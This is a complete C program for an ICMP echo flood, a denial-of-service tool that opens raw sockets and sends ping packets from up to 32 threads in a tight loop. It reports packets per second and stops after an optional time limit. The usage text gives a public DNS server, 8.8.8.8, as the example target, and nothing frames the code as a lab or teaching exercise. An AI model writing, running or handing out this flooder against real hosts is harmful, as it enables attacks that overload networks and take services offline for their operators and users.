#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <pthread.h>
#include <stdatomic.h>
#include <stdbool.h> 

#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <errno.h>

#define PAYLOAD_SIZE 56
#define DEFAULT_THREADS 4

atomic_bool running = true;
atomic_ulong total_packets = 0;
atomic_ulong last_packets = 0;
time_t start_time = 0;
time_t duration = 0;

unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

void *flood_thread(void *arg) {
    char *target_ip = (char *)arg;
    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    inet_pton(AF_INET, target_ip, &dest.sin_addr);

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) {
        perror("socket");
        return NULL;
    }

    char packet[sizeof(struct icmphdr) + PAYLOAD_SIZE];
    struct icmphdr *icmp = (struct icmphdr *)packet;

    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    icmp->un.echo.id = getpid() & 0xFFFF;
    icmp->un.echo.sequence = 0;
    icmp->checksum = 0;

    memset(packet + sizeof(struct icmphdr), 0xAA, PAYLOAD_SIZE);

    int packet_size = sizeof(struct icmphdr) + PAYLOAD_SIZE;

    while (running) {
        icmp->un.echo.sequence++;
        icmp->checksum = 0;
        icmp->checksum = checksum(icmp, packet_size);

        if (sendto(sock, icmp, packet_size, 0,
                   (struct sockaddr *)&dest, sizeof(dest)) > 0) {
            atomic_fetch_add(&total_packets, 1);
        }
    }

    close(sock);
    return NULL;
}

void *stats_thread(void *arg) {             
    (void)arg;                              

    time_t now;
    int elapsed;
    unsigned long pps;

    while (running) {
        sleep(2);

        now = time(NULL);
        elapsed = (int)(now - start_time);
        if (elapsed < 1) elapsed = 1;

        unsigned long current = atomic_load(&total_packets);
        pps = (current - last_packets) / 2;
        last_packets = current;

        printf("\r[Time: %3ds]   Packets: %10lu   PPS: %7lu   ",
               elapsed, current, pps);
        fflush(stdout);

        if (duration > 0 && elapsed >= (int)duration) {
            running = false;
        }
    }
    return NULL;
}

void sigint_handler(int sig) {
    running = false;
    printf("\n\nStopping...\n");
}

int main(int argc, char *argv[]) {
    if (argc != 3 && argc != 4) {
        printf("Usage: sudo %s <target IP> <threads> [seconds]\n", argv[0]);
        printf("  sudo %s 8.8.8.8 12         → unlimited\n", argv[0]);
        printf("  sudo %s 8.8.8.8 12 300     → 5 minutes\n", argv[0]);
        return 1;
    }

    char *target = argv[1];
    int thread_count = atoi(argv[2]);
    if (thread_count < 1) thread_count = DEFAULT_THREADS;
    if (thread_count > 32) thread_count = 32;

    if (argc == 4) {
        duration = atol(argv[3]);
        if (duration < 0) duration = 0;
    }

    signal(SIGINT, sigint_handler);

    start_time = time(NULL);
    printf("Starting → Target: %s  Threads: %d", target, thread_count);
    if (duration > 0)
        printf("  Duration: %ld s\n", duration);
    else
        printf("  Unlimited\n");
    printf("\n");

    pthread_t stats_tid;
    pthread_create(&stats_tid, NULL, stats_thread, NULL); 

    pthread_t *threads = malloc(sizeof(pthread_t) * thread_count);
    if (!threads) {
        perror("malloc");
        return 1;
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_create(&threads[i], NULL, flood_thread, target);
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    running = false;
    pthread_join(stats_tid, NULL);

    free(threads);

    time_t end_time = time(NULL);
    unsigned long final = atomic_load(&total_packets);
    int total_sec = (int)(end_time - start_time);
    if (total_sec < 1) total_sec = 1;

    printf("\n\nFinished:\n");
    printf("Packets sent : %lu\n", final);
    printf("Time         : %d s\n", total_sec);
    printf("Avg PPS      : %.0f\n", (double)final / total_sec);

    return 0;
}